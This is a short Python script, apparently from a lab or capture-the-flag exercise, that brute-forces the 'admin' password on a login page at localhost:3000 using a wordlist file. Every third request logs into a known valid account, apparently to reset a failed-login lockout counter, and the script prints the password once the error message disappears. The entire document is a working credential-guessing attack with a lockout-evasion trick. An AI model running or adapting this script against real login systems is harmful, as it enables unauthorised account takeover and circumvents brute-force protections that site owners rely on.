import requests

with open('password.txt', 'r') as file:
    passwd = file.readlines()
passwd = [line.strip() for line in passwd]

for i in range(0, len(passwd)):
    print(i)
    if i % 3 != 0:
        response = requests.post('http://localhost:3000/page-login', data = {'username': 'admin', 'password': passwd[i]})
        if 'Username or Password is incorrect !' not in response.text:
            print('Here is admin password:', passwd[i])
            break
    else:
        response = requests.post('http://localhost:3000/page-login', data = {'username': 'lethanhtrong', 'password': 'admin'})
